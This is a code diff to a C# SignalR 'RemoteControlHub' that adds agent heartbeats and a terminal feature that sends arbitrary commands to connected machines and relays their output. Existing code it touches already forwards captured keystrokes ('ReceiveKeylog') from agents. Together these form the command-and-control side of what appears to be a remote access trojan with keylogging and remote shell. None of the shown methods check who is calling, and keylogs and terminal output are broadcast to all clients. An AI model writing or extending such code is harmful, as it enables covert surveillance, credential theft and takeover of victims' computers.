@@ -3,10 +3,16 @@ using System.Collections.Concurrent;
 
 namespace WebApp.Hubs
 {
+    public class AgentInfo
+    {
+        public string MachineName { get; set; } = "";
+        public DateTime LastHeartbeat { get; set; }
+    }
+
     public class RemoteControlHub : Hub
     {
-        // Thread-safe dictionary: ConnectionId -> MachineName
-        public static readonly ConcurrentDictionary<string, string> ConnectedAgents = new();
+        // Thread-safe dictionary: ConnectionId -> AgentInfo
+        public static readonly ConcurrentDictionary<string, AgentInfo> ConnectedAgents = new();
 
         public override Task OnConnectedAsync()
         {
@@ -15,9 +21,9 @@ namespace WebApp.Hubs
 
         public override Task OnDisconnectedAsync(Exception? exception)
         {
-            if (ConnectedAgents.TryRemove(Context.ConnectionId, out var machineName))
+            if (ConnectedAgents.TryRemove(Context.ConnectionId, out var info))
             {
-                Clients.All.SendAsync("AgentDisconnected", Context.ConnectionId, machineName);
+                Clients.All.SendAsync("AgentDisconnected", Context.ConnectionId, info.MachineName);
             }
             return base.OnDisconnectedAsync(exception);
         }
@@ -25,14 +31,35 @@ namespace WebApp.Hubs
         // Agent calls this to register
         public async Task RegisterAgent(string machineName)
         {
-            ConnectedAgents.TryAdd(Context.ConnectionId, machineName);
+            ConnectedAgents.AddOrUpdate(Context.ConnectionId, 
+                new AgentInfo { MachineName = machineName, LastHeartbeat = DateTime.UtcNow },
+                (key, oldValue) => new AgentInfo { MachineName = machineName, LastHeartbeat = DateTime.UtcNow });
+            
             await Clients.All.SendAsync("AgentConnected", Context.ConnectionId, machineName);
+        }
+
+        // Agent calls this every 10s
+        public async Task Heartbeat(string machineName)
+        {
+            if (ConnectedAgents.TryGetValue(Context.ConnectionId, out var info))
+            {
+                info.LastHeartbeat = DateTime.UtcNow;
+            }
+            else
+            {
+                await RegisterAgent(machineName);
+            }
+            await Clients.All.SendAsync("ReceiveAgentHeartbeat", Context.ConnectionId);
         }
 
         // Admin calls this on load to get currently connected agents
         public async Task GetConnectedAgents()
         {
-            var agentsList = ConnectedAgents.Select(x => new { id = x.Key, name = x.Value }).ToList();
+            var threshold = DateTime.UtcNow.AddSeconds(-65);
+            var agentsList = ConnectedAgents
+                .Where(x => x.Value.LastHeartbeat >= threshold)
+                .Select(x => new { id = x.Key, name = x.Value.MachineName })
+                .ToList();
             var json = System.Text.Json.JsonSerializer.Serialize(agentsList);
             await Clients.Caller.SendAsync("ReceiveConnectedAgents", json);
         }
@@ -140,6 +167,17 @@ namespace WebApp.Hubs
             // Here targetConnectionId is actually the Hub caller (Agent) passing its ID to broadcast to All
             // Note: In a production app you'd map back to Admin, but broadcast is fine for MVP
             await Clients.All.SendAsync("ReceiveKeylog", Context.ConnectionId, keys);
+        }
+
+        // --- NEW: Terminal ---
+        public async Task RequestExecuteCommand(string targetConnectionId, string command)
+        {
+            await Clients.Client(targetConnectionId).SendAsync("ExecuteTerminalCommand", command);
+        }
+
+        public async Task SendTerminalOutput(string adminConnectionId, string output)
+        {
+            await Clients.All.SendAsync("ReceiveTerminalOutput", Context.ConnectionId, output);
         }
     }
 }
